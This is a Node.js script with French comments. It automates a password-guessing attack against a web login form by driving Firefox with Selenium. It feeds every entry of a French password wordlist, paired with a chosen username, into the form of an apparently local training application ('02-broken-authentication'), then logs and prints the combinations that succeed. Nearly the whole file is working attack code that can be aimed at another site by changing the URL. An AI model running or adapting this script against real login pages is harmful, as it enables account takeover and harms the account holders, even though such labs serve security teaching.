const { Builder, By, Key, until } = require('selenium-webdriver')
const program = require('commander')
const readline = require('readline')
const fs = require('fs')

// Ecrit une ligne dans le fichier logs
const log = (str = '') => {
    fs.appendFileSync(__dirname + '/logs', str + '\n', { encoding: 'utf-8' })
}

program.option('-u, --username <username>', "Nom de l'utilisateur")
program.parse(process.argv)

if (program.username) {
    const { username } = program

    ;(async function credentialStuffing() {
        // Crée une fenêtre Firefox qui sera pilotée par le programme
        let driver = await new Builder().forBrowser('firefox').build()
        try {
            log('-- Démarrage de la capture --')

            const fileStream = fs.createReadStream(__dirname + '/../french_passwords.txt')

            const rl = readline.createInterface({
                input: fileStream,
                crlfDelay: Infinity,
            })
            // Note: we use the crlfDelay option to recognize all instances of CR LF

            for await (const password of rl) {
                // On se rend à l'URI correspondant à l'application
                await driver.get('http://localhost/02-broken-authentication')

                // Entre la chaine de caractères username dans l'input ayant pour nom 'username'
                await driver.findElement(By.name('username')).sendKeys(username)
                // Entre la chaine de caractères password dans l'input ayant pour nom 'password'
                // puis appuie automatiquement sur la touche entrée, ce qui valide le formulaire
                await driver.findElement(By.name('password')).sendKeys(password, Key.ENTER)

                try {
                    const greetings = await driver.wait(until.elementLocated(By.id('greetings')), 100)
                    log(`${Date.now()} >> Couple valide ${username} -> ${password}`)

                    console.log(password)
                    // Déconnexion
                    await driver.findElement(By.name('deconnexion')).sendKeys(Key.ENTER)
                } catch (e) {
                    log(`${Date.now()} >>		 Mauvaises informations de connexion ${username} -> ${password}`)
                }
            }

            log('-- Fin de la capture --')
        } finally {
            driver.quit()
        }
    })()
} else {
    console.log("Vous devez spécifier un nom d'utilisateur")
}
